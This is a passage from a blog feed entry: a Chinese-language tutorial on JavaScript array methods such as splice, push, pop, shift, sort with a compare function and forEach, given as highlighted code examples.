class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> resultarr = arr.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(resultarr)<span class="comment">//打印出[b,c]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)<span class="comment">//打印出[a,d]</span></span><br></pre></td></tr></table></figure><p>该方法第一个参数是截取的起始索引，第二个参数是截取的长度。</p><p>splice方法还可以用于增加或移除元素</p><p>增加元素：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>];</span><br><span class="line">nums.<span class="title function_">splice</span>(<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>);<span class="comment">//第三个参数开始为增添的元素</span></span><br></pre></td></tr></table></figure><p>删除元素：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">100</span>,<span class="number">200</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">nums.<span class="title function_">splice</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(numes);<span class="comment">//打印出1,2,3,4,5</span></span><br></pre></td></tr></table></figure><h4 id="The-variable-element："><a href="#The-variable-element：" class="headerlink" title="The variable element："></a>The variable element：</h4><p>添加元素:</p><p><strong>push()</strong>    从数组后面添加</p><p><strong>unshift()</strong>    从数组头添加</p><p>删除元素：</p><p><strong>pop()</strong>    从数组后面删除</p><p><strong>shift()</strong>    从数组头删除</p><p>本质上就是栈的操作</p><p>数组排序：</p><p><strong>reverse()</strong>    翻转数组元素顺序</p><p><strong>sort()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> names = [<span class="string">&quot;David&quot;</span>,<span class="string">&quot;Mike&quot;</span>,<span class="string">&quot;Cynthia&quot;</span>,<span class="string">&quot;Clayton&quot;</span>,<span class="string">&quot;Bryan&quot;</span>,<span class="string">&quot;Raymond&quot;</span>];</span><br><span class="line">names.<span class="title function_">sort</span>();</span><br><span class="line"><span class="title function_">print</span>(names);<span class="comment">//Bryan,Clayton,Cynthia,David,Mike,Raymond</span></span><br></pre></td></tr></table></figure><p>sort()方法是按照字典顺序对元素进行排序的，因此它假定元素都是字符串类型。即使是Number类型也会转换成字符串类型在进行排序。对于数字的排序，会发生非常不友好的结果。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">100</span>,<span class="number">21</span>];</span><br><span class="line">arr.<span class="title function_">sort</span>();</span><br><span class="line"><span class="title function_">print</span>(arr);<span class="comment">//1,100,11,2,21,3,6</span></span><br></pre></td></tr></table></figure><p>就像上面一样，是按照字符串的字典顺序进行排序的，解决方法是通过sort传入一个大小比较函数解决排序问题</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">compare</span>(<span class="params">num1,num2</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> num1-num2</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> nums = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">100</span>,<span class="number">4</span>,<span class="number">200</span>];</span><br><span class="line">nums.<span class="title function_">sort</span>(compare);<span class="comment">//传入compare函数</span></span><br><span class="line"><span class="title function_">print</span>(nums);<span class="comment">//1,2,3,4,100,200</span></span><br></pre></td></tr></table></figure><h4 id="Lterator-method"><a href="#Lterator-method" class="headerlink" title="Lterator method"></a>Lterator method</h4><p>这些方法对数组中的每个元素应用一个函数，可以返回一个值、一组值或者一个新数组。</p><p>不生成新数组的迭代器方法：</p><p><strong>forEach()</strong>:</p><p>该方法接受一个函数作为参数，对数组中的每个元素使用该函数。</p>]]></content>
    
    
    <summary type="html">js的数据结构二:队列</summary>
    
    
    
    <category term="代码" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    <category term="JavaScript" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/"/>
    
    <category term="算法" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/%E7%AE%97%E6%B3%95/"/>
    
    <category term="描述" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/%E7%AE%97%E6%B3%95/%E6%8F%8F%E8%BF%B0/"/>
    
    
    <category term="代码" scheme="https://www.scery.com/tags/%E4%BB%A3%E7%A0%81/"/>
    
    <category term="JavaScript" scheme="https://www.scery.com/tags/JavaScript/"/>
    
    <category term="算法" scheme="https://www.scery.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="描述" scheme="https://www.scery.com/tags/%E6%8F%8F%E8%BF%B0/"/>
    
  </entry>
  
</feed>
